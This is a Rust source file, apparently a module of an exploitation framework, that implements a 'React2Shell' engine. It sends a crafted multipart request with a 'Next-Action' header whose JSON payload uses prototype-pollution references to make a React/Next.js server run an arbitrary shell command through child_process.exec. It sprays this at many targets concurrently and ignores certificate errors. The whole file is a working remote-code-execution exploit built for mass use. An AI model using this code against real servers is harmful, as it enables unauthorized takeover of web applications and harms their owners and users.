// src/engines/custom/react2shell.rs

use crate::core::exploit_engine::ExploitEngine;
use crate::models::target::Target;
use crate::utils::error::{Result, Error};
use futures::stream::{FuturesUnordered, StreamExt};
use reqwest::multipart::{Form, Part};
use reqwest::Client;
use serde_json::json;
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::Semaphore;

#[derive(Debug, Clone)]
pub struct React2ShellEngine {
    pub payload_cmd: String,
    pub concurrency: usize,
}

impl React2ShellEngine {
    pub fn new(payload_cmd: String, concurrency: usize) -> Self {
        Self {
            payload_cmd,
            concurrency,
        }
    }
}

#[async_trait::async_trait]
impl ExploitEngine for React2ShellEngine {
    async fn exploit(&self, target: &Target) -> Result<()> {
        // Constrói URL alvo (ex: http://ip:port)
        let url = format!("http://{}:{}", target.ip, target.port);

        // Executa o exploit
        send(&self.payload_cmd, &url).await.map_err(|e| Error::Other(e.to_string()))
    }

    async fn exploit_many(&self, targets: &[Target]) -> Result<()> {
        let concurrency = self.concurrency.max(1);
        let semaphore = Arc::new(Semaphore:: new(concurrency));
        let mut tasks = FuturesUnordered::new();

        for target in targets {
            let cmd = self.payload_cmd.clone();
            let url = format!("http://{}:{}", target.ip, target.port);
            let semaphore = semaphore.clone();

            tasks.push(tokio::spawn(async move {
                let _permit = semaphore.acquire().await.unwrap();
                if let Err(e) = send(&cmd, &url).await {
                    eprintln!("[-] Exploit failed on {}: {}", url, e);
                } else {
                    println!("[+] Exploit sent to {}", url);
                }
            }));
        }

        while let Some(res) = tasks.next().await {
            if let Err(e) = res {
                eprintln!("[-] Task panic: {}", e);
            }
        }

        Ok(())
    }
}

async fn send(prefix_value: &str, host: &str) -> Result<()> {
    let payload = build_payload(prefix_value);

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    let res = client
        .post(host)
        .header("Next-Action", "x")
        .multipart(payload)
        .send()
        .await;

    match res {
        Ok(resp) => {
            println!("[*] Response from {}: status {}", host, resp.status());
        }
        Err(e) => {
            match classify(&e) {
                HttpErr::Timeout => println!("[-] {} timed out", host),
                HttpErr::Connect => println!("[-] {} connection failed", host),
                HttpErr::Status(code) => println!("[-] {} returned HTTP {}", host, code),
                HttpErr::Other(msg) => println!("[-] Error on {}: {}", host, msg),
            }
        }
    }

    Ok(())
}

fn build_payload(prefix_value: &str) -> Form {
    let crafted_chunk = json!({
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": "{\"then\": \"$B0\"}",
        "_response": {
            "_prefix": format!(
                "process.mainModule.require(\"child_process\").exec(\"{}\")//",
                prefix_value
            ),
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    });

    Form::new()
        .part("0", Part::text(serde_json::to_string(&crafted_chunk).unwrap()))
        .part("1", Part::text("\"$@0\"".to_string()))
}

#[derive(Debug)]
enum HttpErr {
    Timeout,
    Connect,
    Status(u16),
    Other(String),
}

fn classify(e: &reqwest::Error) -> HttpErr {
    if e.is_timeout() {
        HttpErr::Timeout
    } else if e.is_connect() {
        HttpErr::Connect
    } else if let Some(status) = e.status() {
        HttpErr::Status(status.as_u16())
    } else {
        HttpErr::Other(e.to_string())
    }
}